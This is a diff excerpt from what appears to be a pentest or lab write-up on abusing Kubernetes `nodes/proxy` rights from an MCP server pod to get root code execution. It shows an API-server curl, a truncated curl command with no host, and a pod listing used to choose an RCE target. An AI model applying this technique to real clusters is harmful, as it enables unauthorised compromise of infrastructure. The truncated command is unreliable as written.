@@ -715,7 +715,15 @@ mcp@mcp-server-54464cb475-29ztf:~$ curl -X POST -ks https://10.43.0.1:443/apis/a
 As seen here i have the `nodes/proxy` resource set, this can be abused to get code execution as root
 
 ```python
+curl -sk https://
 
+monitoring/prometheus-server-867bb4fcfd-m4t59 -> ["prometheus-server-configmap-reload","prometheus-server"]
+monitoring/prometheus-kube-state-metrics-7c8c787854-25j6q -> ["kube-state-metrics"]
+default/mcp-server-54464cb475-29ztf -> ["mcp-server"]
+monitoring/prometheus-prometheus-node-exporter-nmntq -> ["node-exporter"]
+kube-system/coredns-76c974cb66-cn7l6 -> ["coredns"]
+kube-system/local-path-provisioner-8686667995-lp9th -> ["local-path-provisioner"]
+kube-system/metrics-server-c8774f4f4-phw6q -> ["metrics-server"]
 ```
 
 I then query the pods to find a suitable one i can use for RCE
